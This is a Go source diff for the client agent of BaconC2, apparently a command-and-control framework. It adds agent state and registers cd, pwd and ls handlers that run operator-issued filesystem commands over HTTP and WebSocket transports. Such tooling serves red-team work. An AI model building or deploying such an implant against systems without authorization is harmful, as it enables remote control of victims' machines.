@@ -15,8 +15,10 @@ import (
 	"github.com/RabbITCybErSeC/BaconC2/client/config"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
+	"github.com/RabbITCybErSeC/BaconC2/client/core/state"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers/filesystem"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
@@ -59,13 +61,21 @@ func main() {
 	transportProtocol := transport.NewHTTPClientTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue, encoderChain)
 	wsTransport := transport.NewWebSocketTransport(cfg.ServerURL, cfg.AgentID)
 
+	// Initialize agent state
+	agentState := state.NewAgentState()
+
+	// Setup command registry
 	commandRegistry := command_handler.GetGlobalCommandRegistry()
 	commandRegistry.RegisterHandler(command_handler.CommandHandler{
 		Name:    "return_results",
 		Handler: transportProtocol.SendResults,
 	})
 
-	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg, commandRegistry)
+	commandRegistry.RegisterStatefulHandler(filesystem.NewCdHandler())
+	commandRegistry.RegisterStatefulHandler(filesystem.NewPwdHandler())
+	commandRegistry.RegisterStatefulHandler(filesystem.NewLsHandler())
+
+	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg, commandRegistry, agentState)
 	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor, cmdQueue, resultQueue)
 
 	if err := client.Initialize(); err != nil {
